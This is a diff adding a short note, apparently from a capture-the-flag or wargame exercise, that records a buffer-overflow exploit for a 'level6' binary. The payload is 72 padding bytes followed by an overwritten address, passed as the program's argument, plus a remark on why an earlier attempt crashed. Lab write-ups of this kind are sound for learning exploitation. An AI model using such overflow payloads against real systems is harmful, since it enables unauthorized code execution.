@@ -1,0 +1,3 @@
+./level6 $(python -c "print('a' * 72 + '\x54\x84\x04\x08')")
+
+previous method doesnt work because level6 ask for parameters, otherwise, it crashed
